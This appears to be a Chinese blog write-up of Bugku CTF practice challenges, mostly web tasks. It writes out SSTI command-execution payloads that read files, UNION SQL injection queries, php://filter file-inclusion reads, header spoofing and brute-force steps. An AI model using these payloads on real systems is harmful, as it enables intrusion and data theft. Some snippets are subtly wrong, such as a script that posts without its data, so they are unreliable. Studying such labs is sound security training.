+<a href=#%e8%bf%99%e4%b8%8d%e6%98%af%e6%91%a9%e6%96%af%e5%af%86%e7%a0%81 aria-label=这不是摩斯密码>这不是摩斯密码</a></li>
+<li>
+<a href=#easy_crypto aria-label=easy_crypto>easy_crypto</a></li>
+<li>
+<a href=#%e7%ae%80%e5%8d%95%e5%8a%a0%e5%af%86 aria-label=简单加密>简单加密</a></li>
+<li>
+<a href=#%e6%95%a3%e4%b9%b1%e7%9a%84%e5%af%86%e6%96%87 aria-label=散乱的密文>散乱的密文</a></li>
+<li>
+<a href=#%e5%87%af%e6%92%92%e9%83%a8%e9%95%bf%e7%9a%84%e5%a5%96%e5%8a%b1 aria-label=凯撒部长的奖励>凯撒部长的奖励</a></li>
+<li>
+<a href=#%e4%b8%80%e6%ae%b5base64 aria-label=一段Base64>一段Base64</a></li>
+<li>
+<a href=#heading aria-label=.!?>.!?</a></li>
+<li>
+<a href=#- aria-label=+[]->+[]-</a></li>
+<li>
+<a href=#%e5%a5%87%e6%80%aa%e7%9a%84%e5%af%86%e7%a0%81 aria-label=奇怪的密码>奇怪的密码</a></li>
+<li>
+<a href=#%e6%89%98%e9%a9%ac%e6%96%af%e6%9d%b0%e6%96%90%e9%80%8a aria-label=托马斯.杰斐逊>托马斯.杰斐逊</a></li>
+<li>
+<a href=#zip%e4%bc%aa%e5%8a%a0%e5%af%86 aria-label=zip伪加密>zip伪加密</a></li>
+<li>
+<a href=#%e5%91%8a%e8%af%89%e4%bd%a0%e4%b8%aa%e7%a7%98%e5%af%86 aria-label=告诉你个秘密>告诉你个秘密</a></li>
+<li>
+<a href=#%e8%bf%99%e4%b8%8d%e6%98%afmd5 aria-label=这不是md5>这不是md5</a></li>
+<li>
+<a href=#%e8%b4%9d%e6%96%af%e5%ae%b6%e6%97%8f aria-label=贝斯家族>贝斯家族</a></li>
+<li>
+<a href=#%e5%af%8c%e5%bc%ba%e6%b0%91%e4%b8%bb aria-label=富强民主>富强民主</a></li>
+<li>
+<a href=#python aria-label=python>python</a></li>
+<li>
+<a href=#%e8%bf%9b%e5%88%b6%e8%bd%ac%e6%8d%a2 aria-label=进制转换>进制转换</a></li>
+<li>
+<a href=#affine aria-label=affine>affine</a></li>
+<li>
+<a href=#crack-it aria-label="Crack it">Crack it</a></li>
+<li>
+<a href=#rsa aria-label=rsa>rsa</a></li>
+<li>
+<a href=#%e6%9d%a5%e8%87%aa%e5%ae%87%e5%ae%99%e7%9a%84%e4%bf%a1%e5%8f%b7 aria-label=来自宇宙的信号>来自宇宙的信号</a></li></ul>
+</li>
+<li>
+<a href=#reverse aria-label=Reverse>Reverse</a><ul>
+<li>
+<a href=#%e5%85%a5%e9%97%a8%e9%80%86%e5%90%91 aria-label=入门逆向>入门逆向</a></li>
+<li>
+<a href=#easy_vb aria-label=Easy_vb>Easy_vb</a></li>
+<li>
+<a href=#easy_re aria-label=Easy_Re>Easy_Re</a></li>
+<li>
+<a href=#%e6%b8%b8%e6%88%8f%e8%bf%87%e5%85%b3 aria-label=游戏过关>游戏过关</a></li></ul>
+</li>
+<li>
+<a href=#%e7%a4%be%e5%b7%a5 aria-label=社工>社工</a><ul>
+<li>
+<a href=#%e5%af%86%e7%a0%81 aria-label=密码>密码</a></li></ul>
+</li>
+<li>
+<a href=#pwn aria-label=Pwn>Pwn</a><ul>
+<li>
+<a href=#pwn1 aria-label=pwn1>pwn1</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h1 id=bugku>Bugku<a hidden class=anchor aria-hidden=true href=#bugku>#</a></h1>
+<h2 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h2>
+<h3 id=web1>Web1<a hidden class=anchor aria-hidden=true href=#web1>#</a></h3>
+<blockquote>
+<p>Des：flag{}。</p>
+</blockquote>
+<p>查看源码即可。</p>
+<h3 id=web2>Web2<a hidden class=anchor aria-hidden=true href=#web2>#</a></h3>
+<blockquote>
+<p>Des：输入验证码即可得到flag。</p>
+</blockquote>
+<p>输入框有输入长度限制，在控制台修改长度即可。</p>
+<h3 id=web3>Web3<a hidden class=anchor aria-hidden=true href=#web3>#</a></h3>
+<blockquote>
+<p>Des：flag{}。</p>
+</blockquote>
+<p>通过get传参，按照题目要求直接传入</p>
+<pre tabindex=0><code>?what=flag
+</code></pre><h3 id=web4>Web4<a hidden class=anchor aria-hidden=true href=#web4>#</a></h3>
+<blockquote>
+<p>Des:post。</p>
+</blockquote>
+<h4 id=方法1>方法1<a hidden class=anchor aria-hidden=true href=#方法1>#</a></h4>
+<p>利用hackbar直接post传参。</p>
+<h4 id=方法2>方法2<a hidden class=anchor aria-hidden=true href=#方法2>#</a></h4>
+<p>利用burp抓包传值。</p>
+<h4 id=方法3>方法3<a hidden class=anchor aria-hidden=true href=#方法3>#</a></h4>
+<p>编写python脚本。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
+
+s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
+r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;&lt;url&gt;&#34;</span>)
+value <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;what&#39;</span>:<span style=color:#e6db74>&#39;flag&#39;</span>}
+r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;&lt;url&gt;&#34;</span>, value)
+print(r<span style=color:#f92672>.</span>text)
+</code></pre></div><h4 id=题目更新>题目更新<a hidden class=anchor aria-hidden=true href=#题目更新>#</a></h4>
+<blockquote>
+<p>Des:看看源代码吧。</p>
+</blockquote>
+<p>查看源代码，发现有两串编码字符串。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311172307995.png alt=image-20210311172307995>
+</p>
+<p>分别对两个字符串进行<code>URL</code>解码：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311172353382.png alt=image-20210311172353382>
+</p>
+<p>按照代码含义将其组合起来：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311172417803.png alt=image-20210311172417803>
+</p>
+<p>放到控制台<code>Console</code>里排版。</p>
+<p>将<code>if</code>判断里与<code>a.value</code>判等的值输入提交框，提交。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=web5>Web5<a hidden class=anchor aria-hidden=true href=#web5>#</a></h3>
+<blockquote>
+<p>Des:矛盾。</p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$num <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;num&#39;</span>];
+<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isnumeric</span>($num)) {
+    <span style=color:#66d9ef>echo</span> $num;
+    <span style=color:#66d9ef>if</span> ($num <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>)
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;flag{********}&#39;</span>;
+}
+</code></pre></div><p>利用<code>1a</code>绕过，例：</p>
+<pre tabindex=0><code>?num=1a01
+</code></pre><h3 id=web6>Web6<a hidden class=anchor aria-hidden=true href=#web6>#</a></h3>
+<blockquote>
+<p>Des:flag{}。</p>
+</blockquote>
+<p>查看源码。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311172456839.png alt=image-20210311172456839>
+</p>
+<p><code>Unicode</code>编码，解码即可。</p>
+<h3 id=web7>Web7<a hidden class=anchor aria-hidden=true href=#web7>#</a></h3>
+<blockquote>
+<p>Des:你必须让它停下。</p>
+</blockquote>
+<p>burp抓包，使用重放(<code>Repeater</code>)模块不断点击<code>go</code>发送页面，注意查看<code>response</code>。</p>
+<h3 id=web8>Web8<a hidden class=anchor aria-hidden=true href=#web8>#</a></h3>
+<blockquote>
+<p>Des:文件包含。</p>
+</blockquote>
+<p>打开题目获得代码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>extract</span>($_GET)
+    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($ac)) {
+        $f <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>(<span style=color:#a6e22e>file_get_contents</span>($fn));
+        <span style=color:#66d9ef>if</span> ($ac <span style=color:#f92672>==</span> $f) {
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;This is flag:&#34;</span> <span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$flag</span><span style=color:#e6db74>&lt;/p&gt;&#34;</span>;
+        } <span style=color:#66d9ef>else</span> {
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;sorry!&lt;/p&gt;&#34;</span>;
+        }
+    }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>按照题目描述，尝试访问<code>flag.txt</code>，</p>
+<p>文件内容为<code>flags</code>，获得<code>flag</code>的条件是<code>ac</code>和<code>fn</code>严格相等，<code>fn</code>从<code>flag.txt</code>进行赋值，通过<code>GET</code>传参<code>?ac=flags&fn=flag.txt</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h4 id=题目更新-1>题目更新<a hidden class=anchor aria-hidden=true href=#题目更新-1>#</a></h4>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>?</span><span style=color:#a6e22e>hello</span><span style=color:#f92672>=</span><span style=color:#a6e22e>file</span>(<span style=color:#e6db74>&#39;flag.php&#39;</span>)
+</code></pre></div><h3 id=web9>Web9<a hidden class=anchor aria-hidden=true href=#web9>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#34;var_dump($</span><span style=color:#e6db74>$args</span><span style=color:#e6db74>);&#34;</span>)  <span style=color:#75715e># 调用两次，$($argc)
+</span></code></pre></div><p>调用全局变量打印所有内容，尝试<code>GLOBAL</code>和<code>GLOBALS</code>。</p>
+<h3 id=simple_ssti_1>Simple_SSTI_1<a hidden class=anchor aria-hidden=true href=#simple_ssti_1>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>页面显示：</p>
+<pre tabindex=0><code>You need pass in a parameter named flag。
+</code></pre><p>查看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
+&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+&lt;<span style=color:#f92672>head</span>&gt;
+    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+    &lt;<span style=color:#f92672>title</span>&gt;Simple SSTI&lt;/<span style=color:#f92672>title</span>&gt;
+&lt;/<span style=color:#f92672>head</span>&gt;
+&lt;<span style=color:#f92672>body</span>&gt;
+You need pass in a parameter named flag。
+<span style=color:#75715e>&lt;!-- You know, in the flask, We often set a secret_key variable.--&gt;</span>
+&lt;/<span style=color:#f92672>body</span>&gt;
+&lt;/<span style=color:#f92672>html</span>&gt;
+</code></pre></div><p>搜了一下，<code>SECRET_KEY</code>是<code>Flask</code>中一个比较重要的变量值。</p>
+<pre tabindex=0><code>?flag=flag
+# 页面回显flag
+?flag=2*2
+# 回显4，说明我们传入的数据是被信任的，存在ssti
+?flag=app.config['SECRET_KEY']
+# 回显报错
+?flag=config['SECRET_KEY']
+# 获得flag
+</code></pre><h3 id=simple_ssti_2>Simple_SSTI_2<a hidden class=anchor aria-hidden=true href=#simple_ssti_2>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>页面和上题一样，也是模板注入。</p>
+<p>查看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
+&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+&lt;<span style=color:#f92672>head</span>&gt;
+    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+    &lt;<span style=color:#f92672>title</span>&gt;Simple SSTI2&lt;/<span style=color:#f92672>title</span>&gt;
+&lt;/<span style=color:#f92672>head</span>&gt;
+&lt;<span style=color:#f92672>body</span>&gt;
+You need pass in a parameter named flag
+&lt;/<span style=color:#f92672>body</span>&gt;
+&lt;/<span style=color:#f92672>html</span>&gt;
+</code></pre></div><p>查看根目录：</p>
+<pre tabindex=0><code>?flag={{config.__class__.__init__.__globals__['os'].popen('ls ..').read()}}
+</code></pre><p>执行结果：</p>
+<pre tabindex=0><code>app bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var
+</code></pre><p>我们挨个查看目录，从第一个开始：</p>
+<pre tabindex=0><code>?flag={{config.__class__.__init__.__globals__['os'].popen('ls ../app/').read()}}
+</code></pre><p>执行结果：</p>
+<pre tabindex=0><code>Dockerfile app.py flag gunicorn.conf.py templates
+</code></pre><p>直接查看<code>flag</code>文件：</p>
+<pre tabindex=0><code>?flag={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
+</code></pre><p>获得<code>flag</code>。</p>
+<h3 id=web10>Web10<a hidden class=anchor aria-hidden=true href=#web10>#</a></h3>
+<blockquote>
+<p>Des:头等舱。</p>
+</blockquote>
+<p><code>F12</code>在<code>Network</code>查看消息头即可。</p>
+<h3 id=计算器>计算器<a hidden class=anchor aria-hidden=true href=#计算器>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>尝试输入结果，但只能输入一位字符，查看控制台元素。</p>
+<p>找到对应的输入框元素，发现长度被限定为1位，修改后输入正确答案。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=web基础_get>web基础$_GET<a hidden class=anchor aria-hidden=true href=#web基础_get>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><code>GET</code>传参直接在<code>URL</code>后键入值即可。</p>
+<p>在<code>URL</code>后加上<code>?what=flag</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=web基础_post>web基础$_POST<a hidden class=anchor aria-hidden=true href=#web基础_post>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>需要通过<code>POST</code>方式传入参数<code>flag</code>，使用<code>hackbar</code>插件。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=矛盾>矛盾<a hidden class=anchor aria-hidden=true href=#矛盾>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>简单分析可知，<code>GET</code>传参，获取<code>flag</code>需要经过两个if判断：1.参数<code>num</code>不为数字；2.参数获取值为1。</p>
+<p>我们可以构造一个字符串，以<code>1</code>开头的字符串在<code>php</code>会被判定成功，在<code>URL</code>后输入<code>?num=1x</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=域名解析>域名解析<a hidden class=anchor aria-hidden=true href=#域名解析>#</a></h3>
+<blockquote>
+<p>Des:听说把网址解析到xxx就能拿到flag。</p>
+</blockquote>
+<p><code>Linux</code>：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>vim /etc/hosts
+</code></pre></div><p>添加：<code>&lt;url> xxx</code>。</p>
+<p>保存后访问网址。</p>
+<p><code>Windows</code>同理。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=你必须让他停下>你必须让他停下<a hidden class=anchor aria-hidden=true href=#你必须让他停下>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>页面不断刷新，查看源码</p>
+<p>猜测<code>flag</code>就在网页中，不断刷新使我们无法看到，使用<code>burp</code>抓包。</p>
+<p>拦截页面后发送至<code>Repeater</code>，不断<code>Go</code>，查看<code>Response</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=本地包含>本地包含<a hidden class=anchor aria-hidden=true href=#本地包含>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=变量>变量<a hidden class=anchor aria-hidden=true href=#变量>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
+	<span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag1.php&#34;</span>;
+	<span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__file__</span>);
+	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;args&#39;</span>])) {
+        $args <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;args&#39;</span>];
+        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/^\w+$/&#34;</span>, $args)) {
+            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;args error!&#34;</span>);
+        }
+        <span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#34;var_dump($</span><span style=color:#e6db74>$args</span><span style=color:#e6db74>);&#34;</span>);
+    }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>两个关键点：正则表达式和<code>$\$args</code>。</p>
+<p>此处正则表达式匹配均为字母的串，匹配不成功则报错；<code>$$args</code>意为可变变量，若<code>$args</code>代表一个变量，那么<code>$$args</code>则代表另一个变量。尝试给<code>args</code>赋一个变量名。</p>
+<p><code>PHP</code>九大全局变量：</p>
+<p><code>$_POST</code>[接收<code>post</code>提交的数据]</p>
+<p><code>$\_GET</code>[接收<code>GET</code>提交的数据]</p>
+<p><code>$\_FILES</code>[文件接收处理]</p>
+<p><code>$\_COOKIE</code>[获取<code>setCookie()</code>中的<code>name</code>值]</p>
+<p><code>$\_SESSION</code>[存储或获取<code>session</code>的值]</p>
+<p><code>$\_REQUEST</code>[有<code>get</code>，<code>post</code>的功能，但较慢]</p>
+<p><code>$_SERVER</code>[预定义服务器的一种变量]</p>
+<p><code>$_GLOBALS</code>[包含了全部变量的全局组合数组]</p>
+<p><code>$\_ENV</code>[包含服务器端环境变量的数组，是<code>PHP</code>中的超级变量，可以在<code>PHP</code>程序<strong>任何位置直接访问</strong>]。</p>
+<p>依次尝试，当传入<code>?args=GLOBALS</code>时成功获得<code>flag</code>。</p>
+<h3 id=头等舱>头等舱<a hidden class=anchor aria-hidden=true href=#头等舱>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>查看源码，没有有用信息，尝试御剑扫描后台。</p>
+<p>发现<code>md5.php</code>，进行访问。</p>
+<p>通过<code>GET</code>传参输入<code>a</code>。</p>
+<p>唔，然后返回最开始的网址，使用<code>burp</code>进行抓包，查看<code>Response</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=网站被黑>网站被黑<a hidden class=anchor aria-hidden=true href=#网站被黑>#</a></h3>
+<blockquote>
+<p>Des:这个题没技术含量但是实战中经常遇到。</p>
+</blockquote>
+<p>给出的访问目录是<code>webshell</code>，御剑扫描后台，进入<code>shell.php</code>，此处对密码进行爆破，在<code>shell</code>处输入密码。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=管理员系统>管理员系统<a hidden class=anchor aria-hidden=true href=#管理员系统>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>是一个登录窗口，查看控制台元素：</p>
+<pre tabindex=0><code>&lt;!-- dGVzdDEyMw== --&gt;
+</code></pre><p>这是<code>Base64</code>编码，解码获得：</p>
+<pre tabindex=0><code>&lt;!-- test123 --&gt;
+</code></pre><p>尝试账密<code>admin/test123</code>。</p>
+<p>页面报错，显示<code>IP</code>禁止访问，猜测应该是对访问地址进行了限制，尝试利用<code>X-Forwarde-For</code>修改<code>XFF</code>头为<code>127.0.0.1</code>。</p>
+<blockquote>
+<p>百度百科：<code>XFF</code>是用来识别通过<code>HTTP</code>代理或负载均衡方式连接到<code>Web</code>服务器的客户端最原始的<code>IP</code>地址的<code>HTTP</code>请求头字段。</p>
+</blockquote>
+<p>获得<code>flag</code>。</p>
+<h3 id=flag在index里面>flag在index里面<a hidden class=anchor aria-hidden=true href=#flag在index里面>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>网页给出一个超链接，点击进行跳转。</p>
+<p>猜测这是<code>admin</code>的密码，查看源码，没有线索，查看<code>URL</code>，发现一个文件包含漏洞。</p>
+<p>这里使用了<code>php</code>的封装协议，资料：http://php.net/manual/zh/wrappers.php.php。</p>
+<p>首先尝试访问http://xxx:port/post/index.php?file=php://filter/resource=index.php。</p>
+<p>网页空白，源码也没有有用信息，但是有5w多行，可能<code>flag</code>藏在里面？</p>
+<p>尝试一下<code>base64</code>编码后访问：http://xxx:port/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</p>
+<p>这是一个<code>file</code>关键字的<code>GET传参</code>，<code>php://</code>是协议名，<code>php://filter/</code>是一种访问本地文件的协议，<code>/read=convert.base64-encode/</code>表示将其进行<code>base64</code>编码后进行读取，<code>resource=index.php</code>就是我们所要访问的目的页面了。</p>
+<p><code>Base64</code>编码后访问<code>URL</code>，得到一串加密字符串：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311172639877.png alt=image-20210311172639877>
+</p>
+<p>进行<code>Base64</code>解码：</p>
+<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;html&gt;
+    &lt;title&gt;Bugku-ctf&lt;/title&gt;
+&lt;?php
+	error_reporting(0);
+	if (!$_GET[file]) {
+        echo '&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;';
+    }
+	$file = $_GET['file'];
+	if (strstr($file, &quot;../&quot;) || stristr($file, &quot;tp&quot;) || stristr($file, &quot;input&quot;) || stristr($file, &quot;data&quot;)) {
+        echo &quot;Oh no!&quot;;
+        exit();
+    }
+	include($file);
+//flag:flag{edulcni_elif_lacol_si_siht}
+?&gt;
+&lt;/html&gt;
+</code></pre><p>获得<code>flag</code>。</p>
+<h3 id=输入密码查看flag>输入密码查看flag<a hidden class=anchor aria-hidden=true href=#输入密码查看flag>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><code>URL</code>：http://xxx:port/baopo/，源码没有有用信息，告知5位数，尝试使用<code>burp</code>进行数字爆破，范围<code>10000-99999</code>。</p>
+<p>随机输入密码后进行抓包。</p>
+<p>然后发送至<code>Intruder</code>，在<code>Intruder</code>界面先选择<code>Clear</code>清除所有<code>Payload</code>，再选中<code>pwd</code>后点击<code>Add</code>。</p>
+<p>在<code>Payload</code>菜单选择攻击字典。</p>
+<p>在<code>Options</code>菜单适当选择攻击线程，加快速度，不过过大的线程可能会导致自己的网络崩溃。</p>
+<p>点击右上角的<code>Start Attack</code>，进入到爆破界面。</p>
+<p>可以随时点击后四个菜单栏进行排序，查看有没有特殊情况，喝杯水的时间就能把整个范围跑完，输入产生特殊值的<code>Payload</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=点击一百万次>点击一百万次<a hidden class=anchor aria-hidden=true href=#点击一百万次>#</a></h3>
+<blockquote>
+<p>Des:JavaScript。</p>
+</blockquote>
+<p>题目已挂。</p>
+<h3 id=备份是个好习惯>备份是个好习惯<a hidden class=anchor aria-hidden=true href=#备份是个好习惯>#</a></h3>
+<blockquote>
+<p>Des:听说备份是个好习惯。</p>
+</blockquote>
+<p>得到一串编码字符串：</p>
+<pre tabindex=0><code>d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
+</code></pre><p>不晓得这是什么&mldr;然后用御剑扫描后台，发现<code>index.php.bak</code>备份文件，下载使用<code>cat</code>命令查看。</p>
+<p>简单判断，需要进行<code>md5碰撞</code>获得<code>flag</code>，而且后台会自动替换掉<code>key</code>关键字，首先查找常见<code>md5碰撞值</code>，然后通过复写<code>key</code>关键字进行绕过：</p>
+<pre tabindex=0><code>?kkeyey1=QNKCDZO&amp;&amp;kkeyey2=s878926199a
+</code></pre><p>将构造字符串置于<code>URL</code>最后，回车访问。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=成绩单>成绩单<a hidden class=anchor aria-hidden=true href=#成绩单>#</a></h3>
+<blockquote>
+<p>Des:快来查查成绩吧。</p>
+</blockquote>
+<p>输入框依次输入<code>1</code>，<code>2</code>，<code>3</code>并提交，成功回显成绩单，当输入<code>4</code>时，页面没有回显。</p>
+<p>查看源码，没有隐藏信息。在输入框输入<code>1'</code>，利用最常见的单引号判断是否存在SQL注入，页面没有回显，继续测试列数，猜测有姓名、数学、英语、语文四列，输入<code>1' order by 4#</code>，页面回显正常，尝试<code>1' order by 5#</code>，页面没有回显，判断表有四列。接下来尝试爆破库名、表名、字段名。</p>
+<p>尝试联合查询，在查询框输入<code>id=1' union select 1,2,3,4#</code>，将我们的代码通过<code>POST传参</code>达到执行的目的，页面回显如下，四个表均有回显。</p>
+<p>开始爆破库名：<code>id=1' union select 1,2,3,database()#</code>，获得库名<code>skctf_flag</code>。</p>
+<p>进一步爆破表名：<code>id=1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_name = database()#</code>，获得两个表：<code>fl4g</code>和<code>sc</code>。</p>
+<p>爆破字段名：<code>id=1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 0x666c3467#</code>，</p>
+<blockquote>
+<p>ps:尝试使用<code>table_name = fl4g</code>时，页面没有回显，将<code>fl4g</code>转为十六进制，<code>0x</code>代表引号。</p>
+</blockquote>
+<p>获得字段名：<code>skctf_flag</code>。</p>
+<p>查看字段名内容：<code>id=-1' union select 1,2,3,skctf_flag from fl4g#</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=秋名山老司机>秋名山老司机<a hidden class=anchor aria-hidden=true href=#秋名山老司机>#</a></h3>
+<blockquote>
+<p>Des:是不是老司机试试就知道。</p>
+</blockquote>
+<p>打开网页后，是一个计算问题，查看源代码。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173035995.png alt=image-20210311173035995>
+</p>
+<p>每次刷新之后，需要计算的数字都不一样，页面通过<code>POST</code>方式传值，这里尝试用<code>python</code>脚本来进行计算：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> re
+
+s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
+r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;&lt;url&gt;&#39;</span>)
+obj <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;(\d+[+\-*])+(\d+)&#39;</span>, r<span style=color:#f92672>.</span>text)
+d <span style=color:#f92672>=</span> {
+    <span style=color:#e6db74>&#39;value&#39;</span>: eval(obj<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>))
+}
+r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;&lt;url&gt;&#39;</span>)
+print(r<span style=color:#f92672>.</span>text)
+</code></pre></div><p>需要访问网站，还需要利用正则表达式对网站给出的数字进行匹配，所以导入<code>requests</code>和<code>re</code>库。</p>
+<p>从<code>requests</code>库导入的类一定要为<code>Session()</code>，若是使用了<code>session()</code>，会导致网页刷新，不能获得正确的值。</p>
+<p><code>s</code>是创建的会话对象，以会话对象向<code>url</code>发出一个<code>get请求</code>。</p>
+<p><code>r</code>用来接受网站访问获得的数据，<code>obj</code>用来存储进行正则表达式匹配后的值，<code>\d+</code>表示匹配一个或多个字符，<code>[+\-*]</code>匹配加号、减号和乘号，但因为减号为特殊符号，这里使用反斜杠<code>\</code>进行转义。<code>re.search</code>扫描一个字符串返回第一个匹配成功的值，<code>r.text</code>为服务器返回页面的内容，<code>r</code>表示字符串为原始字符串，里面的反斜杠<code>\</code>不会被认为是转义符。</p>
